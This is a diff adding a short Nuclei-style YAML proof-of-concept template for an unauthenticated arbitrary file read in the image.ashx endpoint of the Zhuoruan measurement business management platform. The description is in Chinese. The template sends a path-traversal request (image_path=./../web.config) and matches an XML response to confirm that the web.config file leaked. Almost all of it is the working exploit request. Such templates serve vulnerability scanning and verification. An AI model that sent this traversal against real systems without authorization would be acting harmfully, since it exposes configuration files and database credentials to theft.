@@ -1,0 +1,21 @@
+id: zrjl-image-lfi
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 卓软计量业务管理平台 image.ashx 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference:
+    - https://github.com/wy876/POC/commit/9f20511bb02d7babac30c47f48a72d427b7f5a3b#diff-beb942ee6d89079ca05a80e95daa7c973e8ddaef0608eb2775f024d14419a137R3
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/HuameiMeasure/image.ashx?image_path=./../web.config"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "<?xml"
